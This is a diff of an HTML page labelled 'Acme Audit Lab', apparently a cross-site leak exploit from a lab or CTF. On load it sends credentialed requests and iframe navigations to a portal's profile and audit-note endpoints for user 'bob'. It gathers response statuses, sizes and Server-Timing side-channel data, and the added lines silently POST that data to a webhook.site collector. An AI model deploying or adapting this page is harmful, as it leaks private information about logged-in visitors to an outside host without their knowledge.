@@ -1,16 +1,17 @@
 <!doctype html>
 <html lang="ko"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Acme Audit Lab v6</title>
+<title>Acme Audit Lab v7</title>
 <style>
 body{font:16px/1.5 system-ui;max-width:900px;margin:30px auto;padding:0 16px;background:#101827;color:#e8eef8}
 pre{white-space:pre-wrap;overflow-wrap:anywhere;background:#0a111d;padding:14px;border:1px solid #34445d;border-radius:8px}
 button{padding:10px 14px} .muted{color:#a9b7cc}
 </style>
-<body><h1>Acme Audit Lab v6</h1>
-<p class="muted">일반 fetch와 Service Worker navigation 결과를 화면에 표시합니다. 쿠키, 토큰, 응답 본문은 수집하거나 전송하지 않습니다.</p>
+<body><h1>Acme Audit Lab v7</h1>
+<p class="muted">진단은 HTTP 상태와 성능 메타데이터만 전송합니다. 쿠키, 토큰, 응답 본문은 전송하지 않습니다.</p>
 <button id="run">진단 다시 실행</button><pre id="out">준비 중…</pre>
 <script>
 const PORTAL="https://headphones-genesis-norm-linux.trycloudflare.com";
+const REPORT="https://webhook.site/a0c196fd-a120-4b70-877e-51728080435d";
 const out=document.querySelector("#out");
 const targets=[["profile-search-bob","search"],["profile-me","me"],["audit-note-bob","note"]];
 const timing=win=>win.performance.getEntries().map(e=>({type:e.entryType,name:e.name,status:e.responseStatus,workerStart:e.workerStart,responseStart:e.responseStart,responseEnd:e.responseEnd,transferSize:e.transferSize,encodedBodySize:e.encodedBodySize,decodedBodySize:e.decodedBodySize,serverTiming:e.serverTiming?.map(s=>({name:s.name,duration:s.duration,description:s.description}))}));
@@ -26,7 +27,7 @@ async function run(){
    const path=kind==="me"?"/api/profile/me":kind==="note"?"/api/profile/audit-note?employee_id=bob":"/api/profile/search?username=bob";
    try{
     const r=await fetch(PORTAL+path,{mode:"cors",credentials:"include",cache:"no-store"});
-    report.normal.push({label,status:r.status,serverTiming:r.headers.get("Server-Timing"),exposed:r.headers.get("Access-Control-Expose-Headers")});
+    report.normal.push({label,status:r.status});
     await r.body?.cancel();
    }catch(e){report.normal.push({label,error:String(e)});}
   }
@@ -37,8 +38,8 @@ async function run(){
     frame.onload=()=>{
      let item={label};
      try{
-      item.result=frame.contentDocument?.body?.innerText||frame.contentDocument?.documentElement?.innerText||"";
-      item.performance=frame.contentWindow.performance.getEntries().map(e=>({type:e.entryType,name:e.name,status:e.responseStatus,workerStart:e.workerStart,responseStart:e.responseStart,responseEnd:e.responseEnd,serverTiming:e.serverTiming?.map(s=>({name:s.name,duration:s.duration,description:s.description}))}));
+      const p=frame.contentWindow.performance.getEntries().filter(e=>e.entryType==="navigation").map(e=>({status:e.responseStatus,workerStart:e.workerStart,responseStart:e.responseStart,responseEnd:e.responseEnd,transferSize:e.transferSize,encodedBodySize:e.encodedBodySize,decodedBodySize:e.decodedBodySize,serverTiming:e.serverTiming?.map(s=>({name:s.name,duration:s.duration,description:s.description}))}));
+      item.performance=p;
      }catch(e){item.error=String(e);}
      frame.remove();resolve(item);
     };
@@ -51,6 +52,8 @@ async function run(){
  report.pagePerformance=timing(window);
  out.textContent=JSON.stringify(report,null,2);
  document.querySelector("#run").disabled=false;
+ const safe={at:report.at,normal:report.normal,serviceWorker:report.serviceWorker,pagePerformance:report.pagePerformance.filter(e=>e.type==="resource").map(e=>({name:e.name,status:e.status,transferSize:e.transferSize,encodedBodySize:e.encodedBodySize,decodedBodySize:e.decodedBodySize,duration:e.responseEnd}))};
+ fetch(REPORT,{method:"POST",mode:"no-cors",headers:{"Content-Type":"text/plain"},body:JSON.stringify(safe)}).catch(()=>{});
 }
 document.querySelector("#run").addEventListener("click",run);
 run();
